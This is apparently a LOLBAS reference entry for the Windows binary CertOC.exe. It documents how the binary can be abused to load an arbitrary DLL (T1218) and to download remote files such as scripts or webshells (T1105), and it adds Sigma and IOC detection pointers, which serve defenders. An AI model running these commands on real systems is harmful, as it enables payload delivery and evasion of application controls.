---
Acknowledgement:
- Person: Ensar Sa
Author: Ensar Samil
Commands:
- Category: Execute
  Command: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
  Description: Loads the target DLL file
  MitreID: T1218
  OperatingSystem: Windows Server 2022
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute code within DLL file
- Category: Download
  Command: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
  Description: Downloads text formatted files
  MitreID: T1105
  OperatingSystem: Windows Server 2022
  Privileges: User
  Usecase: Download scripts, webshells etc.
Created: 2021-10-07
Description: Used for installing certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
- IOC: Process creation with given parameter
- IOC: Unsigned DLL load via certoc.exe
- IOC: Network connection via certoc.exe
Full_Path:
- Path: c:\windows\system32\certoc.exe
- Path: c:\windows\syswow64\certoc.exe
Name: CertOC.exe
Resources:
- Link: https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
- Link: https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
mitre_data:
  technique_ids:
  - T1218
  - T1105
tags:
- lolbas/osbinaries
---

# CertOC.exe

Used for installing certificates

# Path(s)

- `c:\windows\system32\certoc.exe`
- `c:\windows\syswow64\certoc.exe`

# Download Commands

Downloads text formatted files

```batch
certoc.exe -GetCACAPS {REMOTEURL:.ps1}
```

- **Usecase:** Download scripts, webshells etc.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows Server 2022



# Execute Commands

Loads the target DLL file

```batch
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

- **Usecase:** Execute code within DLL file
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows Server 2022



# Resource(s)

- https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
- https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
# Acknowledgements

- Ensar Samil (Authored, 2021-10-07)
- Ensar Sa